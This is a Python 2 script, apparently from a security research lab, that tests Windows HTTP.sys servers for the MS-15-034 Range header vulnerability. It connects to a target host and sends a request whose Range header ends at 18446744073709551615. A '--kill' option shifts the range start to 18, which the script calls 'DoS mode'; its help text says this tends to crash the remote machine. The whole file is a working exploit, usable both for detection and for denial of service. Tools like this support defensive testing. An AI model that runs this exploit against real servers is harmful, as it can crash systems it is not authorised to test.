#!/usr/bin/python2
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Labs
# Version: 20150415.2
import argparse
import socket
import ssl
import sys

__version__ = "20150415.2"
green = "\x1b[1;32m"
blue = "\x1b[1;34m"
red = "\x1b[1;31m"
cyan = "\x1b[1;36m"
clear = "\x1b[0m"

def banner():
    print """%s
 ▄█   ▄█     ▄████████  ▄█          ▄████████    ▄███████▄ 
███  ███    ███    ███ ███         ███    ███   ███    ███ 
███▌ ███▌   ███    █▀  ███         ███    ███   ███    ███ 
███▌ ███▌   ███        ███         ███    ███   ███    ███ 
███▌ ███▌ ▀███████████ ███       ▀███████████ ▀█████████▀  
███  ███           ███ ███         ███    ███   ███        
███  ███     ▄█    ███ ███▌    ▄   ███    ███   ███        
█▀   █▀    ▄████████▀  █████▄▄██   ███    █▀   ▄████▀  
%s%sMS-15-034%s %sTesting Tool, Version: %s%s%s, %sXiphos Research Labs (2015)%s
    """ %(blue, clear, red, clear, cyan, clear, green, __version__, cyan, clear)
    
def check(target, port, path=None, kill=False, use_ssl=False):
    if kill != False:
        print "%s{+} Warning: Using DoS mode!%s" %(red, clear)
        start = "18"
    else:
        start = "0"
    if path != None:
        request = "GET %s HTTP/1.1\r\nHost: %s\r\nRange: bytes=%s-18446744073709551615\r\n\r\n" %(path, target, start)
    else:
        request = "GET / HTTP/1.1\r\nHost: %s\r\nRange: bytes=%s-18446744073709551615\r\n\r\n" %(target, start)
    try:
        print "%s{+} Creating Socket...%s" %(green, clear)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception, e:
        sys.exit("%s{!} Failed to create socket! Printing trace...%s\n%s" %(red, clear, str(e)))
    print "%s{*} Socket Created...%s" %(cyan, clear)
    if use_ssl == True:
        try:
            print "%s{+} SSL was selected. Going to try use SSL...%s" %(green, clear)
            sock = ssl.wrap_socket(sock)
        except Exception, e:
            sys.exit("%s{!} Failed to wrap socket in SSL! Printing trace...%s\n%s" %(red, clear, str(e)))
    else:
        print "%s{+} SSL was not selected. Not gonna use it.%s" %(green, clear)
        pass
    try:
        print "%s{+} Connecting to %s:%s...%s" %(green, target, port, clear)
        sock.connect((target, int(port)))
    except Exception, e:
        sys.exit("%s{!} Failed to connect to %s:%s! Printing trace...%s\n%s" %(red, target, port, clear, str(e)))
    print "%s{*} Connected to %s:%s %s" %(cyan, target, port, clear)
    try:
        print "%s{+} Sending Request...%s" %(green, clear)
        sock.send(request)
    except Exception, e:
        sys.exit("%s{!} Failed to send request! Printing trace...%s\n%s" %(red, clear, str(e))) 
    print "%s{*} Request Sent!%s" %(cyan, clear)
    try:
        print "%s{+} Getting Response...%s" %(green, clear)
        response = sock.recv(1024)
    except Exception, e:
        sys.exit("%s{!} Failed reading from socket... Printing trace...%s\n%s" %(red, clear, str(e)))
    print "%s{*} Got response... Checking...%s" %(cyan, clear)
    if "Requested Range Not Satisfiable" in response:
        print "%s{$} Looks vulnerable to me!%s" %(blue, clear)
    elif " The request has an invalid header name" in response:
        print "%s{-} Looks patched to me!%s" %(blue, clear)
    else:
        print "%s{?} Don't know to be honest! Inconclusive!%s" %(blue, clear)

def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help="Target host", required=True)
    parser.add_argument('-f', '--file', default=None, help="Path to file to GET on target host (Defaults to /). WARNING: This tends to cause remote boxes to die.")
    parser.add_argument('-s', '--ssl', action="store_true", default=False, help="Use SSL")
    parser.add_argument('-k', '--kill', action="store_true", default=False, help="Use more reliable 'kill' mechanism for DoS PoC purposes")
    parser.add_argument('-p', '--port', default='80', help="Target port")
    args = parser.parse_args()
    if args.ssl:
	    check(target=args.target, port=args.port, path=args.file, kill=args.kill, use_ssl=True)
    else:
        check(target=args.target, port=args.port, path=args.file, kill=args.kill, use_ssl=False)

if __name__ == "__main__":
    main()
